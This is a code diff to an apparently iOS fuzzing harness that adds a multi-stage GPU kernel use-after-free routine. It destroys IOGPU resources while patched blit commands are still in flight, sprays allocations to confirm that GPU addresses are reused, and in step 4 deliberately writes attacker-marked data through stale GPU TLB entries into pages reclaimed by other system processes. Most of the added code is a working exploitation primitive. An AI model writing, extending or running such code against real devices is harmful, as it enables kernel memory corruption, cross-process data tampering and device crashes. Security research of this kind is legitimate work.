@@ -17,6 +17,7 @@
 //   P4 notification port UAF attempts (LAST - may panic)
 //   P5 steady fuzz if alive
 #include "fuzz.h"
+#include <signal.h>
 #include <IOSurface/IOSurfaceRef.h>
 #include <Foundation/Foundation.h>
 #include <UIKit/UIKit.h>
@@ -17495,6 +17496,566 @@ static void p_uat(void) {
     LOG("[uat] done (alive)");
 }
 
+// V111: UAT reclaim detectors on the raw-resource path. Confirmed statics:
+// destroy -> AGXUAT::queueUnmap (32-entry queue; 33rd unmap forces process =
+// PTE clear -> shared pool). Prior sprays only ever hit the inline GPU arena;
+// DATA pages go to the common kernel allocator, and CPU content-detect is
+// impossible (userland pages are scrubbed on grant — xpleak). So the detectors
+// are: STEP 1 = GPUVA reuse (new gpu_resource2 lands on victim's GPUVA);
+// STEP 2 = write-after-reuse (the in-flight blit patched to victim GPUVA runs
+// after the GPUVA/pages were reused, landing 0x41 in OUR new resource, which
+// we read back over its CPU mapping).
+static long uatrec_ms(struct timespec *t0) {
+    struct timespec t1;
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+    return (t1.tv_sec - t0->tv_sec) * 1000 + (t1.tv_nsec - t0->tv_nsec) / 1000000;
+}
+
+static void p_uatrec(void) {
+    int step = atoi(getenv("FUZZ_UATREC_STEP") ?: "0");
+    int delayms = atoi(getenv("FUZZ_UATREC_DELAY_MS") ?: "0");
+    LOG("[uatrec] v111 step %d delay %dms", step, delayms);
+    io_connect_t ourc = open_service("IOGPU", 1);
+    id<MTLDevice> dev = MTLCreateSystemDefaultDevice();
+    id<MTLCommandQueue> mq = [dev newCommandQueue];
+    uint8_t *devObj = *(uint8_t **)((uint8_t *)(__bridge void *)mq + 392);
+    uint8_t *dref = devObj ? *(uint8_t **)(devObj + 656) : NULL;
+    io_connect_t mconn = dref ? *(uint32_t *)(dref + 0x14) : 0;
+    LOG("[uatrec] mconn 0x%x ourc 0x%x", mconn, ourc);
+    if (!mconn || !dev) return;
+
+    if (step == 0 || step == 1) {
+        // ---- STEP 1: GPUVA reuse test (pure lifecycle, no blit)
+        uint64_t gpuvaV = 0;
+        uint8_t *cpuV = NULL;
+        uint32_t ridV = gpu_resource2(mconn, 0x10000, &gpuvaV, &cpuV);
+        LOG("[uatrec] S1 victim rid %u gpuva 0x%llx cpu %p", ridV, gpuvaV, cpuV);
+        if (!ridV) {
+            LOG("[uatrec] S1 victim alloc failed, skipping step 1");
+        } else {
+            struct timespec tf;
+            fsync(fileno(stderr));
+            LOG("[uatrec] S1 destroying victim (PANIC/fault possible)...");
+            kern_return_t kd = ioconnect_trap1(mconn, 1, ridV);
+            clock_gettime(CLOCK_MONOTONIC, &tf);
+            LOG("[uatrec] S1 destroy kr 0x%08x — forcing AGXUAT::process (40 junk unmaps)", kd);
+            int nj = 0;
+            for (int i = 0; i < 40; i++) {
+                uint64_t gj; uint8_t *pj;
+                uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
+                if (rj) { ioconnect_trap1(mconn, 1, rj); nj++; }
+            }
+            LOG("[uatrec] S1 %d junk destroys done (queue overflow => process)", nj);
+            if (delayms > 0) { LOG("[uatrec] S1 delay %dms before W0", delayms); usleep((useconds_t)delayms * 1000); }
+            uint64_t wg[2][16];
+            uint32_t wr[2][16];
+            int wn[2] = {0, 0};
+            long hits = 0, near = 0;
+            for (int wave = 0; wave < 2; wave++) {
+                if (wave == 1) {
+                    long el = uatrec_ms(&tf);
+                    if (el < 1000) usleep((useconds_t)(1000 - el) * 1000);
+                    LOG("[uatrec] S1 W1 at +%ldms (flush-relative)", uatrec_ms(&tf));
+                }
+                for (int i = 0; i < 16; i++) {
+                    uint64_t g = 0; uint8_t *p = NULL;
+                    uint32_t r = gpu_resource2(mconn, 0x10000, &g, &p);
+                    if (!r) continue;
+                    wg[wave][wn[wave]] = g;
+                    wr[wave][wn[wave]] = r;
+                    wn[wave]++;
+                    int ishit = (g == gpuvaV) || (g > gpuvaV && g < gpuvaV + 0x10000);
+                    int isnear = !ishit && g + 0x10000 > gpuvaV - 0x100000 && g < gpuvaV + 0x100000;
+                    if (ishit) hits++;
+                    if (isnear) near++;
+                    LOG("[uatrec] S1 W%d[%d] rid %u gpuva 0x%llx (victim 0x%llx..0x%llx)%s%s",
+                        wave, i, r, g, gpuvaV, gpuvaV + 0x10000,
+                        ishit ? " [HIT] GPUVA REUSED" : "",
+                        isnear ? " (near)" : "");
+                }
+            }
+            LOG("[uatrec] S1 summary: %ld exact/in-range GPUVA hits, %ld near, "
+                "W0 %d/W1 %d allocs (held alive)", hits, near, wn[0], wn[1]);
+            if (hits) LOG("[uatrec] [HIT] S1: GPUVA reuse confirmed via AGXUAT::process flush");
+        }
+    }
+
+    if (step == 0 || step == 2) {
+        // ---- STEP 2: write-after-reuse (content detector). Round 0 = immediate
+        // wave, round 1 = second victim at +1000ms after round 0's flush.
+        struct timespec tf0;
+        memset(&tf0, 0, sizeof tf0);
+        for (int round = 0; round < 2; round++) {
+            if (round == 1) {
+                long el = uatrec_ms(&tf0);
+                if (el < 1000) usleep((useconds_t)(1000 - el) * 1000);
+                LOG("[uatrec] S2 round 1 at +%ldms (round 0 flush-relative)", uatrec_ms(&tf0));
+            }
+            // junk upfront for the forced flush
+            uint32_t junk[40];
+            int nj = 0;
+            for (int i = 0; i < 40; i++) {
+                uint64_t gj; uint8_t *pj;
+                uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
+                if (rj) junk[nj++] = rj;
+            }
+            uint32_t ridV2 = 0;
+            long np = race_prepare(dev, mq, mconn, 0x10000, &ridV2, 8);
+            if (np < 0) { LOG("[uatrec] S2 r%d: race_prepare failed", round); continue; }
+            id<MTLCommandBuffer> cb2 = g_racecb;
+            uint8_t *cv2 = g_racecv;
+            fsync(fileno(stderr));
+            LOG("[uatrec] S2 r%d: victim rid %u slots %ld — destroy + junk flush (PANIC possible)",
+                round, ridV2, np);
+            kern_return_t kd = ioconnect_trap1(mconn, 1, ridV2);
+            if (round == 0) clock_gettime(CLOCK_MONOTONIC, &tf0);
+            for (int i = 0; i < nj; i++) ioconnect_trap1(mconn, 1, junk[i]);
+            LOG("[uatrec] S2 r%d: destroy kr 0x%08x + %d junk destroys — immediate reclaim wave",
+                round, kd, nj);
+            if (delayms > 0) usleep((useconds_t)delayms * 1000);
+            // reclaim wave: same-size raw resources, marker 0x22, held alive
+            uint32_t wr[16];
+            uint8_t *wc[16];
+            int nw = 0;
+            for (int i = 0; i < 16; i++) {
+                uint64_t g = 0; uint8_t *p = NULL;
+                uint32_t r = gpu_resource2(mconn, 0x10000, &g, &p);
+                if (!r) continue;
+                if (p) memset(p, 0x22, 0x10000);
+                wr[nw] = r;
+                wc[nw] = p;
+                nw++;
+                LOG("[uatrec] S2 r%d wave[%d] rid %u gpuva 0x%llx cpu %p", round, i, r, g, p);
+            }
+            // drain the victim cb (intermediate status var — v86 pitfall)
+            long st = 0;
+            for (int w = 0; w < 40; w++) {
+                st = (long)[cb2 status];
+                if (st >= 4) break;
+                usleep(50000);
+            }
+            LOG("[uatrec] S2 r%d: drained, cb status %ld", round, st);
+            // readback (a): old victim mapping — write-after-destroy control
+            if (cv2) {
+                long n41 = 0, nz = 0;
+                for (int i = 0; i < 0x10000; i++) { if (cv2[i] == 0x41) n41++; if (cv2[i]) nz++; }
+                LOG("[uatrec] S2 r%d: victim(old map) 0x41 %ld nz %ld %s", round, n41, nz,
+                    n41 > 0x8000 ? "*** write-after-destroy (v105 control) ***" : "(no write)");
+            }
+            // readback (b): each new resource — 0x41/non-marker = GPU write landed
+            // in pages/GPUVA reused by OUR resource
+            int hits = 0;
+            for (int i = 0; i < nw; i++) {
+                if (!wc[i]) continue;
+                long n41 = 0, nother = 0;
+                for (int j = 0; j < 0x10000; j++) {
+                    if (wc[i][j] == 0x41) n41++;
+                    else if (wc[i][j] != 0x22) nother++;
+                }
+                if (n41 > 0x100 || nother > 0x100) {
+                    LOG("[uatrec] [HIT] S2 r%d wave[%d] rid %u: 0x41 %ld other %ld — "
+                        "RECLAIM CONFIRMED (in-flight blit wrote reused pages)", round, i, wr[i], n41, nother);
+                    hits++;
+                }
+            }
+            if (!hits) LOG("[uatrec] S2 r%d: wave clean (no 0x41/foreign content)", round);
+        }
+    }
+
+    if (step == 0 || step == 3) {
+        // ---- STEP 3: repoint-write. S1 showed LIFO reuse: a top-of-stack victim
+        // comes back as the FIRST gpu_resource2 with exact rid+GPUVA after
+        // destroy+flush. S2 failed because its victim was not top-of-stack, so
+        // the in-flight blit wrote 0x41 into the OLD pages (stale GMMU TLB or
+        // early execution). Here the victim is allocated AFTER the congestion
+        // (strictly last raw alloc), the blit is patched to it, and we catch the
+        // exact reowner of gpuvaV in the wave — if the blit lands 0x41 in the
+        // reowner, the write went into a reallocated live object.
+        int rounds = atoi(getenv("FUZZ_UATREC_ROUNDS") ?: "3");
+        int cong = atoi(getenv("FUZZ_UATREC_CONG") ?: "24");
+        LOG("[uatrec] S3 repoint-write: %d rounds, cong %d, delay %dms", rounds, cong, delayms);
+        for (int round = 0; round < rounds; round++) {
+            // deep congestion FIRST, committed before any raw alloc: the GPU
+            // stays busy for tens of ms while we destroy+reclaim on the CPU
+            id<MTLBuffer> cgS = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+            id<MTLBuffer> cgD = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+            memset([cgS contents], 0x41, 0x1000000);
+            for (int i = 0; i < cong; i++) {
+                id<MTLCommandBuffer> cbx = [mq commandBuffer];
+                id<MTLBlitCommandEncoder> encx = [cbx blitCommandEncoder];
+                [encx copyFromBuffer:cgS sourceOffset:0 toBuffer:cgD destinationOffset:0 size:0x1000000];
+                [encx endEncoding];
+                [cbx commit];
+            }
+            // victim: STRICTLY the last raw allocation (top-of-stack for LIFO reuse)
+            uint64_t gpuvaV = 0;
+            uint8_t *cv = NULL;
+            uint32_t ridV = gpu_resource2(mconn, 0x10000, &gpuvaV, &cv);
+            LOG("[uatrec] S3 r%d: victim rid %u gpuva 0x%llx cpu %p (top-of-stack)", round, ridV, gpuvaV, cv);
+            if (!ridV || !cv) { LOG("[uatrec] S3 r%d: victim alloc failed", round); continue; }
+            memset(cv, 0, 0x10000);
+            // victim blit A(0x41)->tmpMTL, in-place patched to V (race_prepare
+            // mechanics). NB: do NOT rely on raw gpuD after the VM scan — the
+            // scan overwrites every matching qword (v91).
+            id<MTLBuffer> bufA = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+            id<MTLBuffer> bufD = [dev newBufferWithLength:0x10000 options:MTLResourceStorageModeShared];
+            memset([bufA contents], 0x41, 0x10000);
+            id<MTLCommandBuffer> cb = [mq commandBuffer];
+            id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+            [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufD destinationOffset:0 size:0x10000];
+            [enc endEncoding];
+            uint64_t gpuD = [bufD gpuAddress];
+            // patch via gscan_patch (safe cached-region helper, p_gpuvmscan).
+            // First call of the phase MUST be a self-patch (gpuD->gpuD) to build
+            // the region cache without a foreign replacement (v91). gpuD changes
+            // every round (new bufD); if the cached regions miss the new address
+            // (0 slots), rebuild the cache once with a self-patch and retry.
+            long np;
+            if (round == 0) {
+                gscan_patch(gpuD, gpuD);          // cache build, no-op write
+                np = gscan_patch(gpuD, gpuvaV);
+            } else {
+                np = gscan_patch(gpuD, gpuvaV);
+                if (!np) {
+                    LOG("[uatrec] S3 r%d: cache miss for gpuD 0x%llx — rebuilding", round, gpuD);
+                    gscan_patch(gpuD, gpuD);
+                    np = gscan_patch(gpuD, gpuvaV);
+                }
+            }
+            void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+            uint64_t sva = storage ? *(uint64_t *)((uint8_t *)storage + 0x68) : 0;
+            int ridpatch = 0;
+            if (sva) {
+                uint8_t *sg = (uint8_t *)(uintptr_t)sva;
+                for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+                    if (*(uint16_t *)(sg + o + 0x3e) == 2 &&
+                        *(uint32_t *)(sg + o + 0x18) == 0x40 && *(uint32_t *)(sg + o + 0x1c) == 0x40) {
+                        *(uint32_t *)(sg + o + 0x04) = ridV;
+                        ridpatch = 1;
+                    }
+                }
+            }
+            LOG("[uatrec] S3 r%d: ridV %u gv 0x%llx slots %ld ridpatch %d — commit, then destroy+flush",
+                round, ridV, gpuvaV, np, ridpatch);
+            [cb commit];
+            // destroy V, then junk flush (junk created AFTER the destroy, like S1)
+            fsync(fileno(stderr));
+            LOG("[uatrec] S3 r%d: destroying victim (PANIC possible)...", round);
+            kern_return_t kd = ioconnect_trap1(mconn, 1, ridV);
+            int nj = 0;
+            for (int i = 0; i < 40; i++) {
+                uint64_t gj; uint8_t *pj;
+                uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
+                if (rj) { ioconnect_trap1(mconn, 1, rj); nj++; }
+            }
+            LOG("[uatrec] S3 r%d: destroy kr 0x%08x + %d junk destroys (process forced) — reclaim wave",
+                round, kd, nj);
+            if (delayms > 0) usleep((useconds_t)delayms * 1000);
+            // wave: catch the exact reowner of gpuvaV; keep everything alive
+            uint32_t wr[32];
+            uint8_t *wc[32];
+            uint64_t wg[32];
+            int nw = 0, reowner = -1;
+            for (int i = 0; i < 32; i++) {
+                uint64_t g = 0; uint8_t *p = NULL;
+                uint32_t r = gpu_resource2(mconn, 0x10000, &g, &p);
+                if (!r) continue;
+                if (p) memset(p, 0x22, 0x10000);
+                wr[nw] = r;
+                wc[nw] = p;
+                wg[nw] = g;
+                nw++;
+                LOG("[uatrec] S3 r%d wave[%d] rid %u gpuva 0x%llx %s", round, i, r, g,
+                    g == gpuvaV ? "[HIT-candidate] EXACT GPUVA REUSE" : "");
+                if (g == gpuvaV && reowner < 0) reowner = nw - 1;
+            }
+            if (reowner < 0) {
+                LOG("[uatrec] S3 r%d: no exact gpuva match in %d allocs — diagnostics:", round, nw);
+                for (int i = 0; i < nw; i++)
+                    LOG("[uatrec] S3 r%d   [%d] rid %u gpuva 0x%llx", round, i, wr[i], wg[i]);
+                continue;
+            }
+            LOG("[uatrec] S3 r%d: reowner wave[%d] rid %u holds victim gpuva 0x%llx — draining",
+                round, reowner, wr[reowner], gpuvaV);
+            // drain the victim cb (status via intermediate var — v86)
+            [cb waitUntilCompleted];
+            long st = (long)[cb status];
+            LOG("[uatrec] S3 r%d: drained, cb status %ld", round, st);
+            // readback (a): reowner — 0x41 here = write into the reallocated object
+            long n41 = 0, n22 = 0, nz = 0;
+            uint8_t *rp = wc[reowner];
+            for (int i = 0; i < 0x10000; i++) {
+                if (rp[i] == 0x41) n41++;
+                else if (rp[i] == 0x22) n22++;
+                else if (!rp[i]) nz++;
+            }
+            LOG("[uatrec] S3 r%d: reowner 0x41 %ld 0x22 %ld zero %ld %s", round, n41, n22, nz,
+                n41 ? "*** REPOINT-WRITE CONFIRMED [HIT] ***"
+                    : "(clean — write went to old pages or nowhere)");
+            // readback (b): old victim mapping — 0x41 here = stale-TLB/early-exec path
+            long o41 = 0, onz = 0;
+            for (int i = 0; i < 0x10000; i++) { if (cv[i] == 0x41) o41++; if (cv[i]) onz++; }
+            LOG("[uatrec] S3 r%d: old victim map 0x41 %ld nz %ld %s", round, o41, onz,
+                o41 > 0x8000 ? "(write via stale GMMU TLB into OLD pages)" : "");
+            // readback (c): the rest of the wave must be clean
+            int dirty = 0;
+            for (int i = 0; i < nw; i++) {
+                if (i == reowner || !wc[i]) continue;
+                long c41 = 0, cother = 0;
+                for (int j = 0; j < 0x10000; j++) {
+                    if (wc[i][j] == 0x41) c41++;
+                    else if (wc[i][j] != 0x22) cother++;
+                }
+                if (c41 > 0x100 || cother > 0x100) {
+                    LOG("[uatrec] S3 r%d: wave[%d] rid %u DIRTY 0x41 %ld other %ld", round, i, wr[i], c41, cother);
+                    dirty++;
+                }
+            }
+            LOG("[uatrec] S3 r%d summary: write -> %s (reowner 0x41 %ld, old-map 0x41 %ld, other dirty %d)",
+                round,
+                n41 ? "REOWNER (reallocated object)" : (o41 > 0x8000 ? "OLD PAGES (stale TLB)" : "NOWHERE"),
+                n41, o41, dirty);
+        }
+    }
+
+    if (step == 0 || step == 4) {
+        // ---- STEP 4: stale-TLB cross-client spray. S3 confirmed: the in-flight
+        // blit writes through the STALE GMMU TLB into the victim's OLD physical
+        // pages (already returned to the common kernel allocator), window >=
+        // hundreds of ms; the GPU ignores the PTE repoint. So while stale-TLB
+        // writes are in flight, the kernel allocator should hand those pages to
+        // OTHER consumers (WindowServer compositing). Our content (0x41 +
+        // page-indexed marker) then lands in foreign pages -> gpuEvent, kernel
+        // panic, glitches, system-process crashes. We add NO reclaim wave of our
+        // own: the pages must go to someone else. Drain is intentionally not
+        // waited on (no waitUntilCompleted) — the queue drains itself in the
+        // background while we keep spraying.
+        int rounds = atoi(getenv("FUZZ_UATREC_SPRAY_ROUNDS") ?: "100");
+        int cong = atoi(getenv("FUZZ_UATREC_CONG") ?: "8");
+        int roundms = atoi(getenv("FUZZ_UATREC_ROUND_MS") ?: "50");
+        int secs = atoi(getenv("FUZZ_UATREC_S4_SECS") ?: "0");
+        enum { S4NVMAX = 16 };
+        int nv = atoi(getenv("FUZZ_UATREC_S4_NV") ?: "1");
+        if (nv < 1) nv = 1;
+        if (nv > S4NVMAX) { LOG("[uatrec] S4: NV %d > %d, clamped", nv, S4NVMAX); nv = S4NVMAX; }
+        // base 0: accepts hex (0x100000) and dec. v91: the pool-slot copy must
+        // stay "big" — below 0x10000 the slot patch degrades, fall back.
+        int vsz = (int)strtoul(getenv("FUZZ_UATREC_S4_VSZ") ?: "0x10000", NULL, 0);
+        if (vsz < 0x10000) {
+            LOG("[uatrec] S4: VSZ 0x%x < 0x10000 (v91) — falling back to 0x10000", vsz);
+            vsz = 0x10000;
+        }
+        LOG("[uatrec] S4 stale-TLB cross-client spray: %d rounds, cong %d, %dms/round, secs %d, nv %d, vsz 0x%x",
+            rounds, cong, roundms, secs, nv, vsz);
+
+        // system GPU load on the main thread: keep the screen on and make
+        // WindowServer composite continuously (fresh GPU buffer allocs)
+        dispatch_async(dispatch_get_main_queue(), ^{
+            @autoreleasepool {
+                [UIApplication sharedApplication].idleTimerDisabled = YES;
+                UIWindow *win = nil;
+                for (UIScene *sc in [UIApplication sharedApplication].connectedScenes)
+                    if ([sc isKindOfClass:[UIWindowScene class]])
+                        for (UIWindow *w in ((UIWindowScene *)sc).windows) if (w.isKeyWindow) win = w;
+                if (!win) { LOG("[uatrec] S4: no key window — system load degraded"); return; }
+                for (int i = 0; i < 50; i++) {
+                    UIView *v = [[UIView alloc] initWithFrame:CGRectMake(
+                        arc4random_uniform(280), 40 + arc4random_uniform(500), 70, 70)];
+                    v.backgroundColor = [UIColor colorWithRed:arc4random_uniform(100) / 100.0
+                                                        green:arc4random_uniform(100) / 100.0
+                                                         blue:arc4random_uniform(100) / 100.0
+                                                        alpha:0.65];
+                    [win addSubview:v];
+                    CABasicAnimation *rot = [CABasicAnimation animationWithKeyPath:@"transform.rotation"];
+                    rot.fromValue = @0.0;
+                    rot.toValue = @(6.2831853);
+                    rot.duration = 0.4 + arc4random_uniform(100) / 200.0;
+                    rot.autoreverses = YES;
+                    rot.repeatCount = HUGE_VALF;
+                    [v.layer addAnimation:rot forKey:@"uatrec_rot"];
+                    CABasicAnimation *pos = [CABasicAnimation animationWithKeyPath:@"position"];
+                    pos.fromValue = [NSValue valueWithCGPoint:v.center];
+                    pos.toValue = [NSValue valueWithCGPoint:CGPointMake(
+                        v.center.x + (arc4random_uniform(160) - 80),
+                        v.center.y + (arc4random_uniform(160) - 80))];
+                    pos.duration = 0.5 + arc4random_uniform(100) / 200.0;
+                    pos.autoreverses = YES;
+                    pos.repeatCount = HUGE_VALF;
+                    [v.layer addAnimation:pos forKey:@"uatrec_pos"];
+                    CABasicAnimation *opa = [CABasicAnimation animationWithKeyPath:@"opacity"];
+                    opa.fromValue = @1.0;
+                    opa.toValue = @0.15;
+                    opa.duration = 0.3 + arc4random_uniform(100) / 200.0;
+                    opa.autoreverses = YES;
+                    opa.repeatCount = HUGE_VALF;
+                    [v.layer addAnimation:opa forKey:@"uatrec_opa"];
+                }
+                LOG("[uatrec] S4: 50 CoreAnimation storm views installed");
+            }
+        });
+
+        struct timespec t0;
+        clock_gettime(CLOCK_MONOTONIC, &t0);
+        for (int round = 0; round < rounds; round++) {
+            long el = uatrec_ms(&t0);
+            if (secs > 0 && el >= secs * 1000) {
+                LOG("[uatrec] S4: time limit %ds reached at round %d", secs, round);
+                break;
+            }
+            // periodic main-thread snapshot (~every 200ms of spray): forces the
+            // render server to composite our window into fresh GPU buffers
+            if (roundms > 0 && (round % (200 / (roundms > 0 ? roundms : 50) > 0 ? 200 / (roundms > 0 ? roundms : 50) : 1) == 0)) {
+                dispatch_async(dispatch_get_main_queue(), ^{
+                    @autoreleasepool {
+                        for (UIScene *sc in [UIApplication sharedApplication].connectedScenes) {
+                            if (![sc isKindOfClass:[UIWindowScene class]]) continue;
+                            for (UIWindow *w in ((UIWindowScene *)sc).windows) {
+                                if (!w.isKeyWindow) continue;
+                                UIGraphicsImageRenderer *r =
+                                    [[UIGraphicsImageRenderer alloc] initWithSize:w.bounds.size];
+                                [r imageWithActions:^(UIGraphicsImageRendererContext *ctx) {
+                                    [w drawViewHierarchyInRect:w.bounds afterScreenUpdates:YES];
+                                }];
+                            }
+                        }
+                    }
+                });
+            }
+            @autoreleasepool {
+                // congestion FIRST, committed before any raw alloc
+                id<MTLBuffer> cgS = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+                id<MTLBuffer> cgD = [dev newBufferWithLength:0x1000000 options:MTLResourceStorageModeShared];
+                memset([cgS contents], 0x55, 0x1000000);
+                for (int i = 0; i < cong; i++) {
+                    id<MTLCommandBuffer> cbx = [mq commandBuffer];
+                    id<MTLBlitCommandEncoder> encx = [cbx blitCommandEncoder];
+                    [encx copyFromBuffer:cgS sourceOffset:0 toBuffer:cgD destinationOffset:0 size:0x1000000];
+                    [encx endEncoding];
+                    [cbx commit];
+                }
+                // NV victims, allocated back-to-back — each is top-of-stack at
+                // its own alloc (LIFO reuse confirmed in S1)
+                uint32_t vrids[S4NVMAX];
+                uint64_t vgpus[S4NVMAX];
+                uint8_t *vcpus[S4NVMAX];
+                int nvv = 0;
+                for (int v = 0; v < nv; v++) {
+                    vrids[nvv] = gpu_resource2(mconn, vsz, &vgpus[nvv], &vcpus[nvv]);
+                    if (!vrids[nvv] || !vcpus[nvv]) {
+                        LOG("[uatrec] S4 r%d: victim %d alloc failed (rid %u)", round, v, vrids[nvv]);
+                        break;
+                    }
+                    memset(vcpus[nvv], 0, vsz);
+                    LOG("[uatrec] S4 r%d victim[%d] rid %u gpuva 0x%llx cpu %p (top-of-stack)",
+                        round, v, vrids[nvv], vgpus[nvv], vcpus[nvv]);
+                    nvv++;
+                }
+                if (!nvv) { LOG("[uatrec] S4 r%d: no victims, skipping round", round); continue; }
+                // source A: page-indexed pattern — vsz/0x4000 16KB pages, each
+                // starts with qword "USK_STLE" + qword (round<<32 | page) so
+                // panic/gpuEvent DVA dumps correlate back to this spray
+                id<MTLBuffer> bufA = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+                uint8_t *pa = (uint8_t *)[bufA contents];
+                memset(pa, 0x41, vsz);
+                for (int pg = 0; pg < vsz / 0x4000; pg++) {
+                    *(uint64_t *)(pa + pg * 0x4000) = 0x454c54535f4b5355ULL;  // "USK_STLE"
+                    *(uint64_t *)(pa + pg * 0x4000 + 8) = ((uint64_t)round << 32) | (uint32_t)pg;
+                }
+                // NV victim blits: own cb + own bufD per victim, each patched to
+                // its victim's gpuvaV (gscan_patch cache built by self-patch on
+                // the very first blit of round 0; 0-slot miss => one rebuild)
+                id<MTLBuffer> bufDv[S4NVMAX];
+                long nps[S4NVMAX];
+                int ridps[S4NVMAX];
+                int ncb = 0;
+                uint32_t skb = (uint32_t)(vsz >> 10);
+                for (int v = 0; v < nvv; v++) {
+                    bufDv[ncb] = [dev newBufferWithLength:vsz options:MTLResourceStorageModeShared];
+                    if (!bufDv[ncb]) { LOG("[uatrec] S4 r%d: bufD %d alloc failed", round, v); break; }
+                    id<MTLCommandBuffer> cb = [mq commandBuffer];
+                    id<MTLBlitCommandEncoder> enc = [cb blitCommandEncoder];
+                    [enc copyFromBuffer:bufA sourceOffset:0 toBuffer:bufDv[ncb] destinationOffset:0 size:vsz];
+                    [enc endEncoding];
+                    uint64_t gpuD = [bufDv[ncb] gpuAddress];
+                    long np;
+                    if (round == 0 && ncb == 0) {
+                        gscan_patch(gpuD, gpuD);          // cache build, no-op write
+                        np = gscan_patch(gpuD, vgpus[v]);
+                    } else {
+                        np = gscan_patch(gpuD, vgpus[v]);
+                        if (!np) {
+                            gscan_patch(gpuD, gpuD);
+                            np = gscan_patch(gpuD, vgpus[v]);
+                        }
+                    }
+                    void *storage = find_ivar_obj(cb, "torage", 0, "cb");
+                    uint64_t sva = storage ? *(uint64_t *)((uint8_t *)storage + 0x68) : 0;
+                    int ridpatch = 0;
+                    if (sva) {
+                        uint8_t *sg = (uint8_t *)(uintptr_t)sva;
+                        for (long o = 0x48; o + 0x40 <= 0x400; o += 0x40) {
+                            if (*(uint16_t *)(sg + o + 0x3e) == 2 &&
+                                *(uint32_t *)(sg + o + 0x18) == skb && *(uint32_t *)(sg + o + 0x1c) == skb) {
+                                *(uint32_t *)(sg + o + 0x04) = vrids[v];
+                                ridpatch = 1;
+                            }
+                        }
+                    }
+                    [cb commit];
+                    nps[ncb] = np;
+                    ridps[ncb] = ridpatch;
+                    ncb++;
+                }
+                // destroy ALL victims + ONE junk flush; NO reclaim wave — pages
+                // must go to other consumers (WindowServer compositing)
+                fsync(fileno(stderr));
+                kern_return_t kd0 = 0;
+                for (int v = 0; v < nvv; v++) {
+                    kern_return_t kd = ioconnect_trap1(mconn, 1, vrids[v]);
+                    if (v == 0) kd0 = kd;
+                }
+                int nj = 0;
+                for (int i = 0; i < 40; i++) {
+                    uint64_t gj; uint8_t *pj;
+                    uint32_t rj = gpu_resource2(mconn, 0x1000, &gj, &pj);
+                    if (rj) { ioconnect_trap1(mconn, 1, rj); nj++; }
+                }
+                LOG("[uatrec] S4 r%d (+%lds): nvv %d ncb %d vsz 0x%x destroy0 kr 0x%08x nj %d",
+                    round, el / 1000, nvv, ncb, vsz, kd0, nj);
+                for (int v = 0; v < ncb; v++)
+                    LOG("[uatrec] S4 r%d blit[%d] slots %ld ridp %d", round, v, nps[v], ridps[v]);
+            }
+            // FUZZ_UATREC_S4_KILL=N: self-SIGKILL right after round N-1 with
+            // stale-TLB blits still in flight — reproduces the run-1 pattern
+            // (abnormal teardown => gpuEvent storm + system-visible effects)
+            {
+                int killat = atoi(getenv("FUZZ_UATREC_S4_KILL") ?: "0");
+                if (killat && round + 1 == killat) {
+                    LOG("[uatrec] S4: self-SIGKILL now (round %d, blits in flight)", round);
+                    fsync(fileno(stderr));
+                    kill(getpid(), SIGKILL);
+                }
+                // FUZZ_UATREC_S4_CRASH=N: hard fault instead (SIGSEGV is
+                // delivered immediately, unlike SIGKILL which got stuck
+                // behind a wedged IOGPU kernel call in run 3)
+                int crashat = atoi(getenv("FUZZ_UATREC_S4_CRASH") ?: "0");
+                if (crashat && round + 1 == crashat) {
+                    LOG("[uatrec] S4: deliberate crash now (round %d, blits in flight)", round);
+                    fsync(fileno(stderr));
+                    *(volatile uint8_t *)0x0 = 0x42;
+                }
+            }
+            if (round % 10 == 9) {
+                LOG("[uatrec] S4 heartbeat: round %d done, t=%lds (alive)", round + 1, uatrec_ms(&t0) / 1000);
+                fsync(fileno(stderr));
+            }
+            if (roundms > 0) usleep((useconds_t)roundms * 1000);
+        }
+        LOG("[uatrec] S4 done (alive) — app stays up, storm animations keep running");
+    }
+    LOG("[uatrec] done (alive)");
+}
+
 // V109: IOCoreSurfaceRoot (type 0, IOSurfaceRootUserClient, 60 sels).
 // Basis: sel13 init, sel6 create_fast_path, sel2 lock, sel3 unlock, sel1 release.
 // Fuzz: sel7 client_mem (addr/size extremes), sel6 dims, sel27 bulk_attachments,
@@ -17945,6 +18506,7 @@ void *t_iosurface_scaler(void *arg) {
         if (getenv("FUZZ_LASTMILE")) { p_lastmile(); LOG("[probe13] lastmile-only mode, stop"); return NULL; }
         if (getenv("FUZZ_CORESURF")) { p_coresurf(); LOG("[probe13] coresurf-only mode, stop"); return NULL; }
         if (getenv("FUZZ_UAT")) { p_uat(); LOG("[probe13] uat-only mode, stop"); return NULL; }
+        if (getenv("FUZZ_UATREC")) { p_uatrec(); LOG("[probe13] uatrec-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM2")) { p_reclaim2(); LOG("[probe13] reclaim2-only mode, stop"); return NULL; }
         if (getenv("FUZZ_RECLAIM")) { p_reclaim(); LOG("[probe13] reclaim-only mode, stop"); return NULL; }
         if (getenv("FUZZ_GPUUAF")) { p_gpuuaf(); LOG("[probe13] gpuuaf-only mode, stop"); return NULL; }
